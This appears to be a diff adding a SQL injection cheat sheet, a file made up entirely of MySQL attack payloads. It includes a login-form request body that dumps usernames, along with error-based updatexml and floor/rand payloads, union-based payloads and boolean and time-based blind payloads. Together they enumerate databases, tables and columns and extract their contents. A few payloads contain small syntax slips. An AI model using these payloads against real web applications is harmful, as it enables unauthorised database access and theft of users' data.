@@ -1,0 +1,25 @@
+#SQL Injection
+uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from (select username from users)c limit 0,1),0x7e),1)#&submit=Submit
+' or updatexml(1, concat(0x7e, (select version()), 0x7e, (select user())), 0) %23
+' or updatexml(1, concat(0x7e, (select schema_name from information_schema.schemata limit 0,1)), 0) %23
+' or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1)), 0) %23
+' or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='[sheet_name]' limit 0,1)), 0) %23
+' or updatexml(1, concat(0x7e, (select [column_name] from [sheet_name] limit 0,1)), 0) %23
+' and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,([sql]))x from information_schema.tables group by x )a) %23
+' union select version(),user(),database(),4,5
+' union select schema_name from information_schema.schemata limit 0,1
+' union select table_name,2,3,4,5 from information_schema.tables where table_schema=database() limit 0,1
+' union select column_name,2,3,4,5 from information_schema.columns where table_name='[sheet_name]' limit 0,1
+' union select [column_name1],[column_name2],3,4,5 from [sheet_name] limit 0,1
+' and substr(user(),1,1)='r' %23
+' and ascii(mid(version,1,1))=97 %23
+' and ascii(mid(version(),1,1))=97 and sleep(3) %23
+' and if((select count(*) from information_schema.tables where table_schema=database())=10, sleep(3), 1=1) %23
+' and if((length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=10), 1=1, 1=2) %23
+' and if((ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1, 1)))=109, 1=1, 1=2) %23
+' and if((select count(*) from information_schema.columns where table_name=[sheet_name])=10, sleep(3), 1=1) %23
+' and if((length(select column_name from information_schema.columns where table_name=[sheet_name] limit 0,1)=10), 1=1, 1=2) %23
+' and if((ascii(mid((select columns from information_schema.columns where table_name=[sheet_name] limit 0,1), 1, 1)))=109, 1=1, 1=2) %23
+' and if((select count([column_name]) from [sheet_name])=5, 1=1, 1=2) %23
+' and if(length((select count([column_name]) from [sheet_name]))=5, 1=1, 1=2) %23
+' and if(ascii(mid((select count([column_name]) from [sheet_name]), 1, 1))=101, 1=1, 1=2) %23
